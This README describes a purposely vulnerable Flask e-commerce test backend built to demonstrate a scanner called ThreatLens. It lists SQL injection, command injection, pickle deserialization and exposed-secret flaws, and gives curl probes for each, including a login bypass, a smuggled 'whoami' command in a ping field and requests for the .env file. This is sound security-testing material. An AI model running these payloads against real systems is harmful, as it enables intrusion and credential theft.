# 🛒 02 - Vulnerable E-Commerce Backend (Flask)

**Target Port**: `http://localhost:8002`  
**Security Status**: 🔴 **HIGHLY VULNERABLE (CRITICAL / MAJOR RISKS)**

---

## 📋 Overview
This backend simulates an e-commerce catalog and checkout microservice riddled with critical injection flaws, deserialization bugs, and secret exposures for demonstrating ThreatLens's offensive scanning engines.

---

## 🚨 Catalog of Injected Vulnerabilities

| Severity | Vulnerability | Endpoint / Vector | CWE / OWASP |
|---|---|---|---|
| 🔴 **CRITICAL** | **SQL Injection (SQLi)** | `GET /api/products/search?q=`<br>`POST /api/auth/login` | CWE-89 / A03:2021 |
| 🔴 **CRITICAL** | **OS Command Injection (RCE)** | `POST /api/tools/ping` (`host` param) | CWE-78 / A03:2021 |
| 🔴 **CRITICAL** | **Insecure Deserialization** | `POST /api/cart/restore-session` (Pickle) | CWE-502 / A08:2021 |
| 🟠 **HIGH** | **Hardcoded Cloud Secrets** | Leaked AWS Keys & Stripe Tokens | CWE-798 / A07:2021 |
| 🟡 **MEDIUM** | **Exposed Debug Routes** | `GET /debug`, `GET /__debug__`, `GET /.env` | CWE-215 / CWE-552 |
| 🔵 **LOW** | **Missing Security Headers** | Missing CSP, HSTS, X-Frame-Options | CWE-693 |

---

## 🎯 ThreatLens Demo Attack Probes

### 1. SQL Injection Probe
```bash
# Error-based & boolean extraction
curl "http://localhost:8002/api/products/search?q='%20OR%20'1'='1"

# Auth bypass
curl -X POST http://localhost:8002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' --", "password": "any"}'
```

### 2. Command Injection Probe
```bash
curl -X POST http://localhost:8002/api/tools/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; whoami"}'
```

### 3. Exposure Scanner Probe
```bash
curl http://localhost:8002/.env
curl http://localhost:8002/debug
```

---

## 🚀 How to Run
```bash
cd test_backends/02_vulnerable_ecommerce_py
pip install -r requirements.txt
python app.py
```
